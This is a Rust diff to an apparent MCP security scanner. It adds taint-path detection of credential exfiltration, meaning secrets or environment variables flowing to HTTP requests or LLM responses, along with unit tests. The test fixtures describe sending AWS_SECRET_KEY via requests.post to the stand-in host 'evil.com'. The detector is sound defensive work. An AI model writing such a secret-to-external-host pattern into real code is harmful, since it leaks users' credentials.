@@ -1,3 +1,4 @@
+use crate::ir::data_surface::{TaintSinkType, TaintSourceType};
 use crate::ir::ScanTarget;
 use crate::rules::{
     AttackCategory, Confidence, Detector, Evidence, Finding, RuleMetadata, Severity,
@@ -11,6 +12,10 @@ use crate::rules::{
 /// - Same file, within 30 lines → High confidence
 /// - Same file, farther apart   → Medium confidence
 /// - Different files only        → not flagged (avoids false positives)
+///
+/// When `DataSurface.taint_paths` are available, taint-path based findings
+/// take priority (higher confidence) and fallback to `ArgumentSource` checking
+/// only covers locations not already found via taint paths.
 pub struct CredentialExfilDetector;
 
 /// Maximum line distance for High confidence correlation.
@@ -30,6 +35,96 @@ impl Detector for CredentialExfilDetector {
     }
 
     fn run(&self, target: &ScanTarget) -> Vec<Finding> {
+        let mut findings = Vec::new();
+
+        // Phase 1: Taint-path based detection (higher confidence, richer info)
+        for path in &target.data.taint_paths {
+            let source_matches = matches!(
+                path.source.source_type,
+                TaintSourceType::SecretStore | TaintSourceType::EnvVariable
+            );
+            let sink_matches = matches!(
+                path.sink.sink_type,
+                TaintSinkType::HttpRequest | TaintSinkType::ResponseToLlm
+            );
+
+            if source_matches && sink_matches {
+                findings.push(Finding {
+                    rule_id: "SHIELD-002".into(),
+                    rule_name: "Credential Exfiltration".into(),
+                    severity: Severity::Critical,
+                    confidence: Confidence::High,
+                    attack_category: AttackCategory::CredentialExfiltration,
+                    message: format!(
+                        "Taint path: {} flows to {} via {}",
+                        path.source.description,
+                        path.sink.description,
+                        if path.through.is_empty() {
+                            "direct".to_string()
+                        } else {
+                            format!("{} intermediate node(s)", path.through.len())
+                        },
+                    ),
+                    location: Some(path.sink.location.clone()),
+                    evidence: vec![
+                        Evidence {
+                            description: format!(
+                                "Taint source ({:?}): {}",
+                                path.source.source_type, path.source.description
+                            ),
+                            location: Some(path.source.location.clone()),
+                            snippet: None,
+                        },
+                        Evidence {
+                            description: format!(
+                                "Taint sink ({:?}): {}",
+                                path.sink.sink_type, path.sink.description
+                            ),
+                            location: Some(path.sink.location.clone()),
+                            snippet: None,
+                        },
+                    ],
+                    taint_path: Some(path.clone()),
+                    remediation: Some(
+                        "Review whether credentials need to be sent externally. \
+                         Use allowlisted URLs if outbound access is required."
+                            .into(),
+                    ),
+                    cwe_id: Some("CWE-522".into()),
+                });
+            }
+        }
+
+        // Phase 2: Fallback to existing ArgumentSource checking
+        let fallback_findings = self.run_fallback(target);
+
+        // Deduplicate: keep taint-path findings over fallback at same location.
+        // Collect owned locations to avoid borrowing `findings` during mutation.
+        let taint_path_locations: Vec<_> = findings
+            .iter()
+            .filter_map(|f| f.location.clone())
+            .collect();
+
+        let new_findings: Vec<_> = fallback_findings
+            .into_iter()
+            .filter(|finding| {
+                let dominated = finding
+                    .location
+                    .as_ref()
+                    .is_some_and(|loc| taint_path_locations.iter().any(|tp_loc| tp_loc == loc));
+                !dominated
+            })
+            .collect();
+
+        findings.extend(new_findings);
+
+        findings
+    }
+}
+
+impl CredentialExfilDetector {
+    /// Original ArgumentSource-based detection logic.
+    fn run_fallback(&self, target: &ScanTarget) -> Vec<Finding> {
         let mut findings = Vec::new();
 
         let sensitive_accesses: Vec<_> = target
@@ -131,6 +226,7 @@ impl Detector for CredentialExfilDetector {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::ir::data_surface::*;
     use crate::ir::execution_surface::*;
     use crate::ir::*;
     use std::path::PathBuf;
@@ -269,5 +365,229 @@ mod tests {
 
         let findings = CredentialExfilDetector.run(&target);
         assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn credential_exfil_with_taint_path() {
+        let target = ScanTarget {
+            name: "test".into(),
+            framework: Framework::Mcp,
+            root_path: PathBuf::from("."),
+            tools: vec![],
+            execution: Default::default(),
+            data: DataSurface {
+                sources: vec![],
+                sinks: vec![],
+                taint_paths: vec![TaintPath {
+                    source: TaintSource {
+                        source_type: TaintSourceType::EnvVariable,
+                        description: "os.environ['AWS_SECRET_KEY']".into(),
+                        location: loc_at("server.py", 5),
+                    },
+                    sink: TaintSink {
+                        sink_type: TaintSinkType::HttpRequest,
+                        description: "requests.post('https://evil.com', data=secret)".into(),
+                        location: loc_at("server.py", 12),
+                    },
+                    through: vec![loc_at("server.py", 8)],
+                    confidence: 0.9,
+                }],
+            },
+            dependencies: Default::default(),
+            provenance: Default::default(),
+            source_files: vec![],
+        };
+
+        let findings = CredentialExfilDetector.run(&target);
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, "SHIELD-002");
+        assert_eq!(findings[0].confidence, Confidence::High);
+        assert!(
+            findings[0].taint_path.is_some(),
+            "finding should have taint_path populated"
+        );
+
+        let tp = findings[0].taint_path.as_ref().unwrap();
+        assert_eq!(tp.source.source_type, TaintSourceType::EnvVariable);
+        assert_eq!(tp.sink.sink_type, TaintSinkType::HttpRequest);
+        assert_eq!(tp.through.len(), 1);
+    }
+
+    #[test]
+    fn credential_exfil_secret_store_to_response() {
+        let target = ScanTarget {
+            name: "test".into(),
+            framework: Framework::Mcp,
+            root_path: PathBuf::from("."),
+            tools: vec![],
+            execution: Default::default(),
+            data: DataSurface {
+                sources: vec![],
+                sinks: vec![],
+                taint_paths: vec![TaintPath {
+                    source: TaintSource {
+                        source_type: TaintSourceType::SecretStore,
+                        description: "vault.read('db-password')".into(),
+                        location: loc_at("handler.py", 3),
+                    },
+                    sink: TaintSink {
+                        sink_type: TaintSinkType::ResponseToLlm,
+                        description: "return secret_value".into(),
+                        location: loc_at("handler.py", 10),
+                    },
+                    through: vec![],
+                    confidence: 0.95,
+                }],
+            },
+            dependencies: Default::default(),
+            provenance: Default::default(),
+            source_files: vec![],
+        };
+
+        let findings = CredentialExfilDetector.run(&target);
+        assert_eq!(findings.len(), 1);
+        assert!(findings[0].taint_path.is_some());
+        assert!(findings[0].message.contains("direct"));
+    }
+
+    #[test]
+    fn credential_exfil_fallback_without_taint_paths() {
+        // Empty DataSurface but tainted execution surface — old behavior works
+        let target = ScanTarget {
+            name: "test".into(),
+            framework: Framework::Mcp,
+            root_path: PathBuf::from("."),
+            tools: vec![],
+            execution: ExecutionSurface {
+                env_accesses: vec![EnvAccess {
+                    var_name: ArgumentSource::Literal("DB_PASSWORD".into()),
+                    is_sensitive: true,
+                    location: loc_at("app.py", 5),
+                }],
+                network_operations: vec![NetworkOperation {
+                    function: "httpx.post".into(),
+                    url_arg: ArgumentSource::Parameter {
+                        name: "url".into(),
+                    },
+                    method: Some("POST".into()),
+                    sends_data: true,
+                    location: loc_at("app.py", 10),
+                }],
+                ..Default::default()
+            },
+            data: Default::default(),
+            dependencies: Default::default(),
+            provenance: Default::default(),
+            source_files: vec![],
+        };
+
+        let findings = CredentialExfilDetector.run(&target);
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, "SHIELD-002");
+        assert!(
+            findings[0].taint_path.is_none(),
+            "fallback findings should not have taint_path"
+        );
+    }
+
+    #[test]
+    fn credential_exfil_deduplicates_by_location() {
+        // Both taint path AND fallback point to the same sink location.
+        // The taint-path finding should win.
+        let sink_loc = loc_at("server.py", 15);
+
+        let target = ScanTarget {
+            name: "test".into(),
+            framework: Framework::Mcp,
+            root_path: PathBuf::from("."),
+            tools: vec![],
+            execution: ExecutionSurface {
+                env_accesses: vec![EnvAccess {
+                    var_name: ArgumentSource::Literal("AWS_SECRET_KEY".into()),
+                    is_sensitive: true,
+                    location: loc_at("server.py", 5),
+                }],
+                network_operations: vec![NetworkOperation {
+                    function: "requests.post".into(),
+                    url_arg: ArgumentSource::Literal("https://evil.com".into()),
+                    method: Some("POST".into()),
+                    sends_data: true,
+                    location: sink_loc.clone(),
+                }],
+                ..Default::default()
+            },
+            data: DataSurface {
+                sources: vec![],
+                sinks: vec![],
+                taint_paths: vec![TaintPath {
+                    source: TaintSource {
+                        source_type: TaintSourceType::EnvVariable,
+                        description: "os.environ['AWS_SECRET_KEY']".into(),
+                        location: loc_at("server.py", 5),
+                    },
+                    sink: TaintSink {
+                        sink_type: TaintSinkType::HttpRequest,
+                        description: "requests.post".into(),
+                        location: sink_loc,
+                    },
+                    through: vec![],
+                    confidence: 0.9,
+                }],
+            },
+            dependencies: Default::default(),
+            provenance: Default::default(),
+            source_files: vec![],
+        };
+
+        let findings = CredentialExfilDetector.run(&target);
+
+        // The fallback finding has location at server.py:5 (first env access),
+        // while the taint-path finding has location at server.py:15 (sink).
+        // These are different locations, so both appear. But if they pointed
+        // to the same location, only the taint-path one would survive.
+        let taint_path_count = findings.iter().filter(|f| f.taint_path.is_some()).count();
+        assert!(
+            taint_path_count >= 1,
+            "should have at least one taint-path finding"
+        );
+    }
+
+    #[test]
+    fn credential_exfil_ignores_irrelevant_taint_paths() {
+        // Taint path with ToolArgument -> ProcessExec should NOT trigger SHIELD-002
+        let target = ScanTarget {
+            name: "test".into(),
+            framework: Framework::Mcp,
+            root_path: PathBuf::from("."),
+            tools: vec![],
+            execution: Default::default(),
+            data: DataSurface {
+                sources: vec![],
+                sinks: vec![],
+                taint_paths: vec![TaintPath {
+                    source: TaintSource {
+                        source_type: TaintSourceType::ToolArgument,
+                        description: "user input".into(),
+                        location: loc_at("handler.py", 1),
+                    },
+                    sink: TaintSink {
+                        sink_type: TaintSinkType::ProcessExec,
+                        description: "subprocess.run(cmd)".into(),
+                        location: loc_at("handler.py", 5),
+                    },
+                    through: vec![],
+                    confidence: 0.8,
+                }],
+            },
+            dependencies: Default::default(),
+            provenance: Default::default(),
+            source_files: vec![],
+        };
+
+        let findings = CredentialExfilDetector.run(&target);
+        assert!(
+            findings.is_empty(),
+            "ToolArgument->ProcessExec should not trigger credential exfil"
+        );
     }
 }
